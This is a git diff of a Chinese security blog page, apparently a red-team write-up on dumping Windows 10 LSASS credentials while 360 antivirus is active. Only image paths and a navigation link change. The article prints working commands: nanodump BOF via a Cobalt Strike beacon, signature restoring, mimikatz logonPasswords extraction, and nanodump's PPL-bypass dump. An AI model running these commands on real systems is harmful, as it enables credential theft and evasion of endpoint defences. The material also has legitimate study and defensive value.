@@ -76,22 +76,22 @@
             <div class="toc"></div>
             <div class="article-body">
                 <h1 id="360核晶下的dumplsass"><a href="#360核晶下的dumplsass" class="headerlink" title="360核晶下的dumplsass"></a>360核晶下的dumplsass</h1><h2 id="无PPL"><a href="#无PPL" class="headerlink" title="无PPL"></a>无PPL</h2><p>测试环境为Win10 全程开启360核晶</p>
-<p><img src="/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224359620.png" alt="image-20240220224359620"></p>
+<p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224359620.png" alt="image-20240220224359620"></p>
 <p>在免杀上线beacon后利用nanodump BOF直接dump</p>
 <p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/fortra/nanodump">https://github.com/fortra/nanodump</a></p>
 <p>需要注意只有x64的免杀马才能用nanodump</p>
-<p><img src="/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221001840948.png" alt="image-20240221001840948"></p>
+<p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221001840948.png" alt="image-20240221001840948"></p>
 <p>CS下载到本地，若未指定–valid，需要先还原签名</p>
 <p>ps：一开始以为PPL的原因解密时报错LSA </p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./restore_signature WINDOWS-10_1708444406_lsass.dmp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002103881.png" alt="image-20240221002103881"></p>
+<p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002103881.png" alt="image-20240221002103881"></p>
 <p>mimikatz解密</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump WINDOWS-10_1708444406_lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002435120.png" alt="image-20240221002435120"></p>
+<p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002435120.png" alt="image-20240221002435120"></p>
 <h2 id="有PPL"><a href="#有PPL" class="headerlink" title="有PPL"></a>有PPL</h2><p>Win10有PPL进程保护 能dump解密不了 会报LSA的错误</p>
-<p><img src="/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224102918.png" alt="image-20240220224102918"></p>
+<p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224102918.png" alt="image-20240220224102918"></p>
 <p>nanodump中自带了PPL绕过可以尝试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp</span><br></pre></td></tr></table></figure>
 
@@ -144,7 +144,7 @@
                         <br>
                     
                     
-                        <a href="/posts/2943732319.html" class="next-prefix">» </a> 下一篇：    <a href="/posts/2943732319.html" title="发布于 2024-02-20 10:52">Java利用链CommonCollections3分析</a>
+                        <a href="/posts/1628988354.html" class="next-prefix">» </a> 下一篇：    <a href="/posts/1628988354.html" title="发布于 2024-01-31 02:59">nuclei常用templates模板</a>
                     
                 </div>
             </div>
